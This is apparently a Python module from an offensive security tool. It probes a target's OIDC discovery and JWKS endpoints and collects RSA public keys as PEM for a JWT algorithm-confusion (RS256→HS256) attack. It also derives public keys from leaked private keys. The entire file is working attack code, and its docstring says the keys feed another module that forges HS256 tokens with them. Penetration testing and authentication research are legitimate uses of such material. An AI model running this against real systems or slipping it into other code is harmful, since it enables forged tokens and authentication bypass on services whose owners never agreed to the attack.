"""Locate the target's RSA public key(s) — the raw material for a JWT
algorithm-confusion attack (RS256→HS256).

Sources, in order: OIDC/OAuth discovery documents (→ jwks_uri), then a spread of
conventional JWKS paths. Each RSA JWK is converted to a SubjectPublicKeyInfo PEM
so the a02 module can try signing an HS256 token with the PEM as the HMAC key.
"""

from __future__ import annotations

import json

import requests

_DISCOVERY = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]
_JWKS_PATHS = [
    "/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/jwks",
    "/oauth/jwks", "/auth/jwks", "/openid/jwks", "/certs", "/keys", "/oauth2/certs",
]


def _fetch_json(url: str) -> dict | None:
    try:
        r = requests.get(url, timeout=8)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        data = r.json()
    except ValueError:
        return None
    return data if isinstance(data, dict) else None


def _jwk_to_pem(jwk: dict) -> str | None:
    if not isinstance(jwk, dict) or jwk.get("kty") != "RSA":
        return None
    try:
        from cryptography.hazmat.primitives import serialization
        from jwt.algorithms import RSAAlgorithm
        key = RSAAlgorithm.from_jwk(json.dumps(jwk))
        pub = getattr(key, "public_key", lambda: key)()  # if a private key slipped in
        pem = pub.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        return pem.decode()
    except Exception:  # noqa: BLE001 — best-effort
        return None


def _keys_from_jwks(data: dict | None) -> list[str]:
    if not data:
        return []
    entries = data.get("keys")
    if entries is None and data.get("kty"):
        entries = [data]
    pems = []
    for jwk in entries or []:
        pem = _jwk_to_pem(jwk)
        if pem:
            pems.append(pem)
    return pems


def discover_public_keys(base_url: str) -> list[str]:
    """Return de-duplicated RSA public keys (PEM) reachable from the target."""
    base = base_url.rstrip("/")
    pems: list[str] = []

    for disc in _DISCOVERY:
        doc = _fetch_json(f"{base}{disc}")
        if doc and doc.get("jwks_uri"):
            pems += _keys_from_jwks(_fetch_json(doc["jwks_uri"]))

    for path in _JWKS_PATHS:
        pems += _keys_from_jwks(_fetch_json(f"{base}{path}"))

    seen, out = set(), []
    for p in pems:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


def public_pem_from_private(private_pem: str) -> str | None:
    """Derive the public-key PEM from a leaked RSA private key."""
    try:
        from cryptography.hazmat.primitives import serialization
        key = serialization.load_pem_private_key(private_pem.encode(), password=None)
        return key.public_key().public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode()
    except Exception:  # noqa: BLE001
        return None
